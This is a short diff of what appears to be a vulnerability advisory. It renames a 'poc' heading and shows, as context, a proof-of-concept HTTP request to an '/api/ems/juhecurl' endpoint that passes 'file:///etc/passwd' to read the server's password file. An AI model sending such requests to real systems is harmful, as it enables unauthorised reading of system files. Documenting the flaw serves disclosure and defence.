@@ -8,7 +8,7 @@
 "/VwmRIfEYDH.php"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
